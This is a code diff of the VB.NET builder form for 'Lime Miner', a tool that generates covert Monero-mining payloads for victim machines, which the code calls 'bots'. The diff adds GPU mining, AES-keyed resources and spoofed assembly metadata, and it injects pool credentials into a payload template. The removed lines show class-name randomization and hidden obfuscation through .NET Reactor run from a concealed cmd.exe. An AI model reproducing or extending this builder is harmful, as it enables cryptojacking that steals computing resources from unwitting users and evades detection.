@@ -1,5 +1,6 @@
 ﻿'------------------------------------------
 'Lime Miner - a simple xmr miner builder | Nyan Cat 8/27/2018
+' Updated Jun/5/2019
 '
 'github.com/NYAN-x-CAT
 '------------------------------------------
@@ -7,6 +8,7 @@
 
 Imports System.IO
 Imports System.Runtime.InteropServices
+Imports System.Security.Cryptography
 
 Public Class Form1
     Public Shared rand As New Random()
@@ -16,25 +18,21 @@ Public Class Form1
         Codedom.F = Me
 
         BackgroundWorker1.RunWorkerAsync()
-
         GiveTip()
+
     End Sub
 
     Private Sub GiveTip()
         Try
-            Select Case rand.Next(4)
+            Select Case rand.Next(3)
                 Case 0
                     HuraAlertBox1.Text = "[*] Auto optimal threads settings based by bot's CPU model"
 
                 Case 1
-                    HuraAlertBox1.Text = "[*] If user is Idle, CPU settings will be max"
+                    HuraAlertBox1.Text = "[*] If there is no GPU, The miner will use CPU"
 
                 Case 2
-                    HuraAlertBox1.Text = "[*] If user is active, CPU settings will be normal"
-
-                Case 3
-                    HuraAlertBox1.Text = "[*] Miner will be delayed for 15sec"
-
+                    HuraAlertBox1.Text = "[*] Miner will use only 50% of CPU or GPU"
             End Select
             HuraAlertBox1.Visible = True
         Catch ex As Exception
@@ -43,14 +41,13 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-           HuraForm1.Text = "Lime Miner v0.1 @" + Environment.UserName
+            HuraForm1.Text = "Lime Miner v0.3 @" + Environment.UserName
         Catch ex As Exception
         End Try
 
         Try
             txtInstallPathMain.SelectedIndex = 0
             txtInjection.SelectedIndex = 0
-            txtDotNET.SelectedIndex = 0
         Catch ex As Exception
         End Try
 
@@ -88,61 +85,44 @@ Public Class Form1
         End Try
     End Sub
 
-    Public Shared OutputPayload
-    Public Shared Resources_DLL = Randomi(rand.Next(5, 10))
-    Public Shared Resources_Parent = Randomi(rand.Next(5, 10))
+    Public OutputPayload
+    Public Resources_dll = Randomi(rand.Next(5, 10))
+    Public Resources_cpu = Randomi(rand.Next(5, 10))
+    Public Resources_nvidia = Randomi(rand.Next(5, 10))
+    Public Resources_amd = Randomi(rand.Next(5, 10))
+    Public Resources_Parent = Randomi(rand.Next(5, 10))
+    Public AESKEY As String = Randomi(rand.Next(5, 10))
 
     Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
 
         Try
             If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
-            Dim Source = My.Resources.Main_
+            Dim Source = My.Resources.Program
             txtLog.Text = txtLog.Text.Insert(0, "Starting..." + vbNewLine)
-            Source = Replace(Source, "IMG1", Resources_DLL)
+            Source = Replace(Source, "#dll", Resources_dll)
+            Source = Replace(Source, "#cpu", Resources_cpu)
+            Source = Replace(Source, "#nvidia", Resources_nvidia)
+            Source = Replace(Source, "#amd", Resources_amd)
+            Source = Replace(Source, "#ParentRes", Resources_Parent)
+            Source = Replace(Source, "#USER", txtPoolUsername.Text)
+            Source = Replace(Source, "#URL", txtPoolURL.Text)
+            Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
+            Source = Replace(Source, "#KEY", AESKEY)
+
 
             txtLog.Text = txtLog.Text.Insert(0, "Adding injection " + txtInjection.Text + vbNewLine)
-            If txtInjection.Text = "Regasm.exe" Then
-                Source = Replace(Source, "InjectionMethod", "Path.Combine(RuntimeEnvironment.GetRuntimeDirectory()," & Chr(34) & "Regasm.exe" & Chr(34) & ")")
-            Else
-                Source = Replace(Source, "InjectionMethod", "Application.ExecutablePath")
-            End If
 
             If chkInstall.Checked = True Then
-                Source = Replace(Source, "'%install", Nothing)
-                If chkFileHidden.Checked = True Then
-                    Source = Replace(Source, "'%Hidden", Nothing)
-                End If
+                Source = Replace(Source, "#Const INS = False", "#Const INS = True")
+                Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
             End If
 
-            Source = Replace(Source, "chkDrop", chkInstall.Checked.ToString)
-            Source = Replace(Source, "Payload.exe", txtInstallFileName.Text)
-            Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
-            Source = Replace(Source, "ParentRes", Resources_Parent)
-            Source = Replace(Source, "USER_", txtPoolUsername.Text)
-            Source = Replace(Source, "URL_", txtPoolURL.Text)
-            Source = Replace(Source, "PWD_", txtPoolPassowrd.Text)
-
-
-
-            'Rename Classes...
-            txtLog.Text = txtLog.Text.Insert(0, "Generate a simple USG..." + vbNewLine)
-            Source = Replace(Source, "Main_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "Sleeping", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "EXE_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "Path_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "Resources_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "LoadFile", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "Get_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "_Run", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "DLL_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "RunPE_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "Compression_", Randomi(rand.Next(5, 10)))
-            Source = Replace(Source, "GZip_", Randomi(rand.Next(5, 10)))
 
             If chkAssembly.Checked = True Then
                 txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly Information..." + vbNewLine)
-                Source = Replace(Source, "'%ASSEMBLY%", Nothing)
-            Source = Replace(Source, "%Title%", txtTitle.Text)
+                Source = Replace(Source, "#Const Assembly = False", "#Const Assembly = True")
+
+                Source = Replace(Source, "%Title%", txtTitle.Text)
                 Source = Replace(Source, "%Description%", txtDescription.Text)
                 Source = Replace(Source, "%Company%", txtCompany.Text)
                 Source = Replace(Source, "%Product%", txtProduct.Text)
@@ -152,6 +132,8 @@ Public Class Form1
                 Source = Replace(Source, "%v2%", num_Assembly2.Text)
                 Source = Replace(Source, "%v3%", num_Assembly3.Text)
                 Source = Replace(Source, "%v4%", num_Assembly4.Text)
+                Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)
+
             End If
 
             If chkIcon.Checked Then
@@ -162,26 +144,12 @@ Public Class Form1
 
             If Codedom.OK = True Then
 
-                'Using .NET reactor for more obfuscation, you can remove the whole process if you want
-                txtLog.Text = txtLog.Text.Insert(0, "Obfuscation..." + vbNewLine)
-                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", UnGZip(My.Resources.dotNET_Reactor))
-                Dim process As New Process()
-                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
-                process.StartInfo.FileName = "cmd.exe"
-                process.StartInfo.UseShellExecute = True
-                process.StartInfo.CreateNoWindow = True
-                process.StartInfo.WorkingDirectory = IO.Path.GetTempPath
-                process.StartInfo.Arguments = "/C dotNET_Reactor.exe -file """ & OutputPayload & """ -control_flow_obfuscation 1  -flow_level 3 -suppressildasm 1 -obfuscation 1 -antitamp  0 -resourceencryption 0 -targetfile """ & OutputPayload & """"
-                process.Start()
-                process.WaitForExit()
-
                 txtLog.Text = txtLog.Text.Insert(0, "Done!..." + vbNewLine)
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                 btnBuild.Enabled = True
 
                 Try
                     IO.File.Delete(IO.Path.GetTempPath + "\" + Resources_Parent + ".Resources")
-                    IO.File.Delete(OutputPayload + ".hash")
                 Catch ex As Exception
                 End Try
 
@@ -213,43 +181,14 @@ Public Class Form1
         Return sb.ToString
     End Function
 
-    Public Shared Function GZip(ByVal B As Byte()) As Byte()
-        Dim MS As New IO.MemoryStream
-        Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
-        Ziped.Write(B, 0, B.Length)
-        Ziped.Dispose()
-        MS.Position = 0
-        Dim buffer As Byte() = New Byte((CInt(MS.Length) + 1) - 1) {}
-        MS.Read(buffer, 0, buffer.Length)
-        MS.Dispose()
-        Return buffer
-    End Function
-
-    Public Shared Function UnGZip(ByVal B As Byte()) As Byte()
-        Dim MS As New IO.MemoryStream(B)
-        Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
-        Dim buffer As Byte() = New Byte(4 - 1) {}
-        MS.Position = (MS.Length - 5)
-        MS.Read(buffer, 0, 4)
-        Dim count As Integer = BitConverter.ToInt32(buffer, 0)
-        MS.Position = 0
-        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
-        Ziped.Read(array, 0, count)
-        Ziped.Dispose()
-        MS.Dispose()
-        Return array
-    End Function
-
     Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
         If chkInstall.Checked = True Then
             chkInstall.Text = "Install ON"
             txtInstallPathMain.Enabled = True
-            txtInstallRegKey.Enabled = True
             txtInstallFileName.Enabled = True
         Else
             chkInstall.Text = "Install OFF"
             txtInstallPathMain.Enabled = False
-            txtInstallRegKey.Enabled = False
             txtInstallFileName.Enabled = False
         End If
     End Sub
@@ -430,5 +369,9 @@ Public Class Form1
         If Me.HuraTabControl1.SelectedIndex = 0 Then
             GiveTip()
         End If
+    End Sub
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        GiveTip()
     End Sub
 End Class
